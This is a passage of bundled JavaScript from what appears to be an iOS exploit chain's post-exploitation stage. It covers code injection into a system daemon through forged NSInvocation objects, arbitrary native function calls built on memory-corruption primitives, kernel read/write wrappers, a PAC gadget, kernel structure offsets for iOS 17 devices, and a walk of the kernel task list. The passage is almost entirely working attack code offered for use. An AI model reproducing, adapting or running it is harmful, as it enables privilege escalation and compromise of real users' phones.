		//console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));

		const nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
		Native.write(nativeLocalBuff, localCallBuff.buffer);
		this.task.write(callBuff, nativeLocalBuff, localCallBuff.byteLength);
		Native.callSymbol("free", nativeLocalBuff);

		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff, 0);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x8n, 1);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x10n, 2);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x18n, 3);

		// This NSInvocation should in turn call the final NSInvocation we created before,
		// but with fully controlled arguments
		this.task.write64(mem, this.#invokingAddr);
		this.#callObjc(jsinv, "setTarget:", inv);
		this.#callObjc(jsinv, "setSelector:", this.#invokeUsingIMPSel);
		this.#callObjc(jsinv, "setArgument:atIndex:", mem, 2);

		// Replace NSInvocation
		this.task.write64(storval + 0x10n, jsinv);
		this.task.write64(storval + 0x18n, 0n);
		//console.log(TAG, "NSInvocation replaced");

		// Write loader.js in remote task
		//const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
		console.log(TAG, "JS script length: " + this.#injectCode.length);
		const scriptMem = BigInt(this.task.call(1000, "calloc", 1, this.#injectCode.length + 1) || 0);
		if (!scriptMem) {
			console.log(TAG, "calloc scriptMem failed");
			return false;
		}
		const scriptStr = this.#writeCFStr(scriptMem, this.#injectCode);
		this.task.call(100, "free", scriptMem);
		//console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));

		// Check if we write ok
		// console.log(TAG,"Check if we write ok" )
		// const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
		// const len = this.#callObjc(scriptStr, "length");
		// console.log(TAG, len);
		// const b = this.#callObjc(scriptStr, "UTF8String");
		// this.task.read(b, a, this.#injectCode.length + 1);
		// const c = Native.readString(a, this.#injectCode.length);
		// console.log(TAG, c);
		

		//const loaderStr = this.#writeCFStr(mem, "loader");
		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));

		// Defer evaluateScript until startScript() so tokens can be applied first.
		this.#pendingJsContext = jscontext;
		this.#pendingScriptStr = scriptStr;
		console.log(TAG, "JS script prepared (deferred) for target: " + this.#target);

		return true;
	}

	#findInvoking() {
		//console.log(TAG, "Find 'invoking()'...");

		let startAddr = BigInt(Native.dlsym("_CF_forwarding_prep_0") || 0);
		startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
		//console.log(TAG, "startAddr: " + Utils.hex(startAddr));

		if (!startAddr)
			return 0n;

		if (xnuVersion.major == 24 && xnuVersion.minor >= 5)
			startAddr -= 0x2500n;
		else
			startAddr -= 0x4000n;

		const pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
		Native.write(Native.mem, pattern.buffer);
		let foundAddr = BigInt(Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16) || 0);
		//console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));

		if (!foundAddr) {
			// special case for iOS 17.4-17.4.1
			//console.log(TAG,`Didnt found invoking,trying to find it for special version`);
			startAddr = BigInt(Native.dlsym("CFCharacterSetIsCharacterMember") || 0);
			startAddr = startAddr & 0x7fffffffffn;
			foundAddr = BigInt(Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16) || 0);
			//console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
			if (!foundAddr)
				return 0n;
		}

		const buff = Native.read(foundAddr - BigInt(Native.memSize), Native.memSize);
		const buff32 = new Uint32Array(buff);

		for (let i=buff32.length-1; i>=0; i--) {
			foundAddr -= 0x4n;
			if (buff32[i] == 0xd503237f) {
				const found = foundAddr;
				console.log(TAG, "Invoking found: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(found));
				return found;
			}
		}

		return 0n;
	}

	#callObjc(obj, selName, ...args) {
		const sel = Native.callSymbol("sel_registerName", selName);
		// 30s: covers slow objc/JSC bring-up inside configd (was effectively 10s)
		return this.task.call(30000, "objc_msgSend", obj, sel, ...args);
	}

	#callObjcRetain(obj, selName, ...args) {
		const ret = this.#callObjc(obj, selName, ...args);
		this.#callObjc(ret, "retain");
		return ret;
	}

	#callObjcInBackground(obj, selName, ...args) {
		const performSelectorInBackground = Native.callSymbol("sel_registerName", "performSelectorInBackground:withObject:");
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(30000, "objc_msgSend", obj, performSelectorInBackground, sel, ...args);
	}

	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100;
		this.task.writeStr(dst, str);
		return this.task.call(100, "CFStringCreateWithCString", 0, dst, kCFStringEncodingUTF8);
	}

	#printClass(obj) {
		const cl = this.#callObjc(obj, "class");
		const desc = this.#callObjc(cl, "description");
		const str = this.#callObjc(desc, "UTF8String");
		this.task.read(str, Native.mem, 32);
		const classDesc = Native.readString(Native.mem);
		console.log(TAG, "class: " + classDesc);
	}
}


/***/ }),

/***/ "./src/libs/Chain/Chain.js":
/*!*********************************!*\
  !*** ./src/libs/Chain/Chain.js ***!
  \*********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Chain)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");


const TAG = "CHAIN"

class Chain
{
	static #driver;
	static #mutex;

	static init(driver, mutex=null)
	{
		this.#driver = driver;
		this.#mutex = mutex;
	}

	static destroy()
	{
		this.#driver.destroy();
	}

	static runPE()
	{
		return this.#driver.runPE();
	}

	static getKernelBase()
	{
		return this.#driver.getKernelBase();
	}

	static getSelfTaskAddr()
	{
		return this.#driver.getSelfTaskAddr();
	}

	static read(srcAddr, dst, len)
	{
		this.#mutexLock();
		let ret = this.#driver.read(srcAddr, dst, len);
		this.#mutexUnlock();
		return ret;
	}

	static write(dst, src, len)
	{
		this.#mutexLock();
		let ret = this.#driver.write(dst, src, len);
		this.#mutexUnlock();
		return ret;
	}

	static readBuff(srcAddr, len)
	{
		if (!this.read(srcAddr, Native.mem, len))
			return false;
		return Native.read(Native.mem, len);
	}

	static read8(src)
	{
		this.read(src, Native.mem, 1);
		return Native.read8(Native.mem);
	}

	static read16(src)
	{
		this.read(src, Native.mem, 2);
		return Native.read16(Native.mem);
	}

	static read32(src)
	{
		this.read(src, Native.mem, 4);
		return Native.read32(Native.mem);
	}

	static read64(src)
	{
		this.read(src, Native.mem, 8);
		return Native.read64(Native.mem);
	}

	static write8(dst, value)
	{
		Native.write8(Native.mem, value);
		this.write(dst, Native.mem, 1);
	}

	static write16(dst, value)
	{
		Native.write16(Native.mem, value);
		this.write(dst, Native.mem, 2);
	}

	static write32(dst, value)
	{
		Native.write32(Native.mem, value);
		this.write(dst, Native.mem, 4);
	}

	static write64(dst, value)
	{
		Native.write64(Native.mem, value);
		this.write(dst, Native.mem, 8);
	}

	static offsets()
	{
		return this.#driver.offsets();
	}

	static strip(val)
	{
		return this.#driver.strip(val);
	}

	static writeZoneElement(dstAddr,src,len)
	{
		return this.#driver.writeZoneElement(dstAddr, src, len);
	}

	static getPaciaGadget()
	{
		return this.#driver.getPaciaGadget();
	}
	static getClearPaciaGadget()
	{
		return this.#driver.getClearPaciaGadget();
	}

	static transferRW()
	{
		let rwCtx = this.#driver.transferRW();
		let controlSocket = rwCtx.controlSocket;
		let rwSocket = rwCtx.rwSocket;
		console.log(TAG, "controlSocket: " + controlSocket);
		console.log(TAG, "rwSocket: " + rwSocket);

		let portPtr = Native.mem;
		Native.callSymbol("fileport_makeport", controlSocket, portPtr);
		let controlPort = Native.read32(portPtr);

		Native.callSymbol("fileport_makeport", rwSocket, portPtr);
		let rwPort = Native.read32(portPtr);

		return {
			controlPort: controlPort,
			rwPort: rwPort,
			controlSocket: controlSocket,
			rwSocket: rwSocket
		};
	}

	static threadSpawn(scriptCFString, threadMem) {
		this.#driver.threadSpawn(scriptCFString, threadMem);
	}

	static testKRW() {
		console.log(TAG, "Testing KRW");
		console.log(TAG, "- kernelBase: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getKernelBase()));
		console.log(TAG, "- PACIA gadget: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getPaciaGadget()));
		console.log(TAG, "- Read kernel magic (4 bytes)");

		let buff = this.readBuff(this.getKernelBase(), 4);
		if (!buff) {
			console.log(TAG, "kernel RW not working!");
			return false;
		}
		let buff32 = new Uint32Array(buff);
		console.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(buff32[0])}`);

		if (buff32[0] != 0xfeedfacf) {
			console.log(TAG, "Invalid magic!");
			return false;
		}

		return true;
	}

	static #mutexLock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_lock", this.#mutex);
	}

	static #mutexUnlock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_unlock", this.#mutex);
	}
}


/***/ }),

/***/ "./src/libs/Chain/Native.js":
/*!**********************************!*\
  !*** ./src/libs/Chain/Native.js ***!
  \**********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Native)
/* harmony export */ });
const RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;

class Native {

	// Preallocated memory chunk for general purpose stuff for public use
	static mem = 0n;
	static memSize = 0x4000;

	// Preallocated memory chunk for encoding/decoding of string arguments
	static #argMem = 0n;

	// Pointer to next available memory for native argument
	static #argPtr = 0n;

	static {
		this.mem = this.callSymbol("malloc", this.memSize);
		this.#argMem = this.callSymbol("malloc", 0x1000n);
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);
		this.callSymbol("memcpy", ptr, buffPtr, buff.byteLength);
	}
	static write32(ptr, value) {
		let buffWrite = new ArrayBuffer(4);
		const view = new DataView(buffWrite);
		view.setUint32(0, value, true);
		this.write(ptr, buffWrite);
	}

	static read(ptr, length) {
		let buffRes = new ArrayBuffer(length);
		let buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);
		this.callSymbol("memcpy", buffPtr, ptr, length);
		return buffRes;
	}

	static read8(ptr) {
		let buff = this.read(ptr, 1);
		const view = new DataView(buff);
		return view.getUint8(0);
	}

	static read16(ptr) {
		let buff = this.read(ptr, 2);
		const view = new DataView(buff);
		return view.getUint16(0, true);
	}

	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getUint32(0, true);
	}

	static read64(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	static readPtr(ptr) {
		return this.read64(ptr);
	}

	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}

	static write8(ptr, value) {
		let buffWrite = new ArrayBuffer(1);
		const view = new DataView(buffWrite);
		view.setUint8(0, value);
		this.write(ptr, buffWrite);
	}

	static write16(ptr, value) {
		let buffWrite = new ArrayBuffer(2);
		const view = new DataView(buffWrite);
		view.setUint16(0, value, true);
		this.write(ptr, buffWrite);
	}

	static write32(ptr, value) {
		let buffWrite = new ArrayBuffer(4);
		const view = new DataView(buffWrite);
		view.setUint32(0, value, true);
		this.write(ptr, buffWrite);
	}

	static write64(ptr, value) {
		let buffWrite = new ArrayBuffer(8);
		const view = new DataView(buffWrite);
		view.setBigUint64(0, value, true);
		this.write(ptr, buffWrite);
	}

	static writeString(ptr, str) {
		//const buff = this.stringToBytes(str, true);
		//this.write(ptr, buff);
		this.callSymbol("memcpy", ptr, str, str.length + 1);
	}

	static getCString(str) {
		return get_cstring(str);
	}

	static #prepareArg(arg) {
		if(!arg)
			arg = 0n;
		if(typeof(arg) === "string")
			return get_cstring(arg);
		return BigInt(arg);
	}

	static strip(address) {
		return address & 0x7fffffffffn;
	}

	static pacia(address, modifier) {
		address = Native.strip(address);
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}

	static dlsym(name) {
		return Native.callSymbol("dlsym", RTLD_DEFAULT, name);
	}

	static callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
		let funcSymbol = null;
		if(name === "dlysm")
			funcSymbol = DLSYM;
		else
			funcSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));
		a0 = this.#prepareArg(a0);
		a1 = this.#prepareArg(a1);
		a2 = this.#prepareArg(a2);
		a3 = this.#prepareArg(a3);
		a4 = this.#prepareArg(a4);
		a5 = this.#prepareArg(a5);
		a6 = this.#prepareArg(a6);
		a7 = this.#prepareArg(a7);
		a8 = this.#prepareArg(a8);
		a9 = this.#prepareArg(a9);
		a10 = this.#prepareArg(a10);
		a11 = this.#prepareArg(a11);
		a12 = this.#prepareArg(a12);
		a13 = this.#prepareArg(a13);
		a14 = this.#prepareArg(a14);
		a15 = this.#prepareArg(a15);
		let chosen_fcall = null;
		if(typeof fcall_with_pacia !== 'undefined')
			chosen_fcall = fcall_with_pacia;
		else
			chosen_fcall = fcall;
		const ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn)
			return Number(ret64);
		if (ret64 == 0xffffffffffffffffn)
			return -1;
		return ret64;
	}

	static callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
		return Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i])
				break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}

	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated)
			s8[str.length] = 0x0;
		return s8.buffer;
	}

	static #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {
		// Initialize argPtr to point to general purpose memory chunk
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);
		// Reset argPtr
		this.#argPtr = this.#argMem;
		return this.#fromNative(ret);
	}

	static #fromNative(value) {
		if (!(value instanceof ArrayBuffer))
			return value;
		const view = new DataView(value);
		return view.getBigInt64(0, true);
	}

	static #toNative(value) {
		// Strings need to be manually written to native memory
		if (typeof value === 'string') {
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return this.#bigIntToArray(ptr);
		}
		else if (typeof value === 'bigint') {
			return this.#bigIntToArray(value);
		}
		else
			return value;
	}

	static #bigIntToArray(value) {
		let a = new Uint8Array(8);
		for (let i=0; i<8; i++) {
			a[i] = Number(value & 0xffn)
			value >>= 8n;
		}
		return a.buffer;
	}
	static gc() {
	}
}

// Register global Native class
globalThis.Native = Native;


/***/ }),

/***/ "./src/libs/Chain/OffsetsStruct.js":
/*!*****************************************!*\
  !*** ./src/libs/Chain/OffsetsStruct.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ OffsetsStruct)
/* harmony export */ });
const OFFSET_KERNEL_BASE  = 0xfffffff007004000n
//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max
//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max
const OFFSET_KERNEL_TASK = 0x0n
const OFFSET_TASK_MAP = 0x28n
const OFFSET_TASK_NEXT = 0x30n
const OFFSET_TASK_PREV = 0x38n
const OFFSET_TASK_THREADS = 0x58n
const OFFSET_TASK_IPC_SPACE = 0x300n
const OFFSET_TASK_PROC_RO = 0x3a0n
const OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1
const OFFSET_TASK_EXC_GUARD = 0x5d4n

const OFFSET_IPC_SPACE_TABLE = 0x20n
const OFFSET_IPC_ENTRY_OBJECT =	0x0n
const OFFSET_IPC_OBJECT_KOBJECT = 0x48n
const OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n
const OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n

const OFFSET_PROC_PID = 0x60n
const OFFSET_PROC_P_COMM = 0x568n

const OFFSET_THREAD_OPTIONS = 0x70n
const OFFSET_THREAD_KSTACKPTR = 0xf0n
const OFFSET_THREAD_ROP_PID = 0x160n
const OFFSET_THREAD_JOP_PID = 0x168n
const OFFSET_THREAD_GUARD_EXC_CODE = 0x330n
const OFFSET_THREAD_TASK_THREADS = 0x370n
const OFFSET_THREAD_TRO = 0x380n
const OFFSET_THREAD_AST = 0x3a4n
const OFFSET_THREAD_MUTEX_DATA = 0x3b0n
const OFFSET_THREAD_CTID = 0x430n

const OFFSET_TRO_TASK = 0x20n

const OFFSET_VM_HDR_RBH_ROOT = 0x38n
const OFFSET_VM_RBE_LEFT = 0x0n
const OFFSET_VM_RBE_RIGHT = 0x8n

const OFFSET_VM_OBJECT_VOU_SIZE = 0x18n
const OFFSET_VM_OBJECT_REF_COUNT = 0x28n

const OFFSET_VM_NAMED_ENTRY_COPY = 0x10n
const OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n

const OFFSET_MIG_LOCK = 0x0n;
const OFFSET_MIG_SBXMSG = 0x0n;
class OffsetsStruct
{
	constructor() {
		this.baseKernel = OFFSET_KERNEL_BASE;
		this.kernelTask = OFFSET_KERNEL_TASK;
		this.T1SZ_BOOT = 17n;

		this.mapTask = OFFSET_TASK_MAP;
		this.nextTask = OFFSET_TASK_NEXT;
		this.prevTask = OFFSET_TASK_PREV;
		this.threads = OFFSET_TASK_THREADS;
		this.ipcSpace = OFFSET_TASK_IPC_SPACE;
		this.procRO = OFFSET_TASK_PROC_RO;
		this.procSize = OFFSET_TASK_PROC_SIZE;
		this.excGuard = OFFSET_TASK_EXC_GUARD;

		this.spaceTable = OFFSET_IPC_SPACE_TABLE;
		this.entryObject = OFFSET_IPC_ENTRY_OBJECT;
		this.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;
		this.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;
		this.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;

		this.pid = OFFSET_PROC_PID;
		this.pComm = OFFSET_PROC_P_COMM;

		this.options = OFFSET_THREAD_OPTIONS;
		this.kstackptr = OFFSET_THREAD_KSTACKPTR;
		this.ropPid = OFFSET_THREAD_ROP_PID;
		this.jopPid = OFFSET_THREAD_JOP_PID;
		this.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;
		this.taskThreads = OFFSET_THREAD_TASK_THREADS;
		this.tro = OFFSET_THREAD_TRO;
		this.ast = OFFSET_THREAD_AST;
		this.mutexData = OFFSET_THREAD_MUTEX_DATA;
		this.ctid = OFFSET_THREAD_CTID;

		this.troTask = OFFSET_TRO_TASK;

		this.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;
		this.rbeLeft = OFFSET_VM_RBE_LEFT;
		this.rbeRight = OFFSET_VM_RBE_RIGHT;

		this.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;
		this.refCount = OFFSET_VM_OBJECT_REF_COUNT;

		this.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;
		this.next = OFFSET_VM_NAMED_ENTRY_NEXT;
		this.migLock = OFFSET_MIG_LOCK;
		this.migSbxMsg = OFFSET_MIG_SBXMSG;
	}
}


/***/ }),

/***/ "./src/libs/Driver/Driver.js":
/*!***********************************!*\
  !*** ./src/libs/Driver/Driver.js ***!
  \***********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ DriverPostExpl)
/* harmony export */ });
/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ "./src/libs/Driver/Offsets.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");


const TAG = "DRIVER-POSTEXPL"

class DriverPostExpl
{
	#offsets;
	#kernelBase;

	constructor() {
		this.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__["default"].getByDeviceAndVersion();
	}

	runPE() {
		console.log(TAG, `runPE()`);
		if (!this.#offsets) {
			console.log(TAG, `Offsets were not obtained, aborting`);
			return false;
		}
		/*
		let baseKernel = startSandworm();
		if (baseKernel == -1)
			return false;
		*/
		this.#kernelBase = mpd_kernel_base();

		return true;
	}

	getPaciaGadget() {
		return mpd_pacia_gadget();
	}

	getKernelBase() {
		return this.#kernelBase;
	}

	getSelfTaskAddr() {
		console.log(TAG, `getSelfTaskAddr`);

		let selfTaskKaddr = 0;
		for (let i=0; i<5; i++)
		{
			selfTaskKaddr = this.#findSelfTaskKaddr(true);
			if (!selfTaskKaddr)
			{
				console.log(TAG, `Searching the other way around`);
				selfTaskKaddr = this.#findSelfTaskKaddr(false);
			}
			else
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",20000);
		}
		return selfTaskKaddr;
	}

	#findSelfTaskKaddr(direction) {
		let kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;
		console.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(kernelTaskAddr)}`);

		let kernelTaskVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		this.read(kernelTaskAddr, kernelTaskVal, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		kernelTaskVal = uread64(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
		kernelTaskVal = BigInt(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
		let ourPid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("getpid");
		console.log(TAG, `Our pid:${ourPid}`);
		let nextTask = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		if (direction)
			this.read(kernelTaskVal + this.#offsets.nextTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		else
			this.read(kernelTaskVal + this.#offsets.prevTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		nextTask = uread64(nextTask);
		//console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);

		while (nextTask != 0 && nextTask != kernelTaskVal) {
			let procROAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(nextTask + this.#offsets.procRO, procROAddr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
			procROAddr = uread64(procROAddr);
			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
			let procVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(procROAddr, procVal, 8);
			procVal = BigInt(uread64(procVal));
			//console.log(TAG,`procVal:${Utils.hex(procVal)}`);
			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
				let pid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				this.read(procVal + this.#offsets.pid, pid, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				let buffRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(pid, 4);
				let view = new DataView(buffRes);
				pid = view.getUint32(0,true);
				//console.log(TAG,`pid:${Utils.hex(pid)}`);
				if (pid == ourPid) {
					console.log(TAG, `Found our pid`);
					return nextTask;
				}
				let nextTaskLocation = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				if (direction)
					this.read(nextTask + this.#offsets.nextTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				else
					this.read(nextTask + this.#offsets.prevTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				nextTask = uread64(nextTaskLocation);
			}
			else
				break;
		}
		return false;
	}

	read(srcAddr, dst, len) {
		srcAddr = this.strip(srcAddr);
		if (srcAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(srcAddr)}`);
			return false;
		}
		kread_length(srcAddr,dst, len);
		return true;
	}

	write(dst, src, len) {
		let dstAddr = this.strip(dst);
		if (dstAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot write:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(dstAddr)}`);
			return false;
		}
		kwrite_length(dst, src, len);
		return true;
	}

	writeZoneElement(dstAddr, src, len) {
		return kwrite_zone_element(dstAddr, src, len);
	}

	offsets() {
		return this.#offsets;
	}

	strip(val) {
		return xpac(val);
	}

	transferRW() {
		return {
			controlSocket: mpd_control_socket(),
			rwSocket: mpd_rw_socket()
		};
	}

	threadSpawn(scriptCFString, threadMem) {
		mpd_js_thread_spawn(scriptCFString, threadMem, true);
	}
}


/***/ }),

/***/ "./src/libs/Driver/Offsets.js":
/*!************************************!*\
  !*** ./src/libs/Driver/Offsets.js ***!
  \************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Offsets)
/* harmony export */ });
/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ "./src/libs/Chain/OffsetsStruct.js");
/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ "./src/libs/Driver/OffsetsTable.js");


const TAG  = "OFFSETS"

class Offsets
{
	static getByDeviceAndVersion()
	{
		Native.callSymbol("uname", Native.mem);
		const sysname = Native.readString(Native.mem, 0x100);
		const nodename = Native.readString(Native.mem + 0x100n, 0x100);
		const release = Native.readString(Native.mem + 0x200n, 0x100);
		const version = Native.readString(Native.mem + 0x300n, 0x100);
		const machine = Native.readString(Native.mem + 0x400n, 0x100);
		console.log(TAG, `release: ${release} with machine: ${machine}`);

		const buildVer = this.getBuildVersion();
		console.log(TAG, "Build version: " + buildVer);

		let splittedVersion = release.split(".");
		let xnuMajor = splittedVersion[0];
		let xnuMinor = splittedVersion[1];

		let splittedMachine = machine.split(",");
		let deviceFamily = splittedMachine[0];
		let deviceModel = splittedMachine[1];

		console.log(TAG, "deviceFamily: " + deviceFamily);

		// Ugly hack to support 17.7, 17.7.1 and 17.7.2
		if (buildVer) {
			if (buildVer == "21H16")
				xnuMinor = 6.1;
			else if (buildVer == "21H216")
				xnuMinor = 6.2;
			else if (buildVer == "21H221")
				xnuMinor = 6.3;
		}
		// Get offsets per device family
		let deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];
		if (!deviceOffsets) {
			console.log(TAG, `Unsupported machine: ${machine}`);
			return null;
		}

		let familyOffsets = deviceOffsets["*"];
		let foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);

		if (!foundFamilyOffsets)
			return null;

		// Adjustments per device model
		let modelOffsets = deviceOffsets[deviceModel];
		let foundModelOffsets = null;
		if (modelOffsets)
